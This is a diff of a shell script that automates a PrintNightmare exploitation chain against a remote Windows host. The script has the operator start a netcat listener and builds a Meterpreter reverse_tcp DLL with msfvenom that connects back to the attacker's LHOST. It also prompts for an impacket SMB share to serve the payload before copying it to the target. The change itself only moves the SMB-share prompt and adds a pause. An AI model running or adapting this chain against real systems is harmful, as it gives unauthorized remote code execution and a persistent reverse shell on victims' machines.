@@ -237,8 +237,6 @@ read REMOTE
 
 echo -e '\E[32;40m' "${bold}Start up a listener with nc -lvnp $LPORT"; tput sgr0
 
-echo -e '\E[32;40m' "${bold}Start up an SMB Share with smbserver.py -smb2support share ."; tput sgr0
-
 sleep 5
 
 echo "Installing necessary tools and creating new folder"
@@ -253,6 +251,8 @@ pip3 install .
 python3 ./setup.py install
 echo "Creating MSFVenom shell.dll file for 64 bit Windows system"
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f dll > shell.dll
+echo -e '\E[32;40m' "${bold}Start up an SMB Share with smbserver.py -smb2support share . in impakt/impacket"; tput sgr0
+sleep 10
 echo "Trying to copy shell.dll to Remote Host"
 #If impacket is not within your path, you may need to put the full path below
 echo "Trying to pass PrintNightmare to Remote System from $LHOST using Share that should be started"
